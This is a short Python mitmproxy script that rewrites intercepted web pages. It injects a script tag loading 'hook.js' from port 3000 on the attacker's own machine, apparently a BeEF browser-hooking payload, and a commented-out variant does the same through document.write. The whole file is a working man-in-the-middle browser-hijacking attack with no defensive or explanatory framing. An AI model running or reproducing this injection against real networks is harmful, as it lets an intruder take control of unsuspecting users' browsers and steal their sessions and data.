from mitmproxy import http
import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = "Could not get local IP address"
    finally:
        s.close()
    return local_ip

def response(flow):
    
    local_ip = get_local_ip()
    decoded_content = flow.response.content.decode('utf-8') #decode the bytes object to string
    new_content = decoded_content.replace("</body>", f'<script type="text/javascript" src="http://{local_ip}:3000/hook.js"></script></body>')
    flow.response.content = new_content.encode('utf-8') #encode the string back to bytes object


    
#    new_content = decoded_content.replace("</body>", f"""<script> var commandModuleStr = '<script src="http://{local_ip}:3000/hook.js" type="text/javascript"><\/script>';document.write(commandModuleStr);</script></body>""")


    
    
    
    
        

    
    
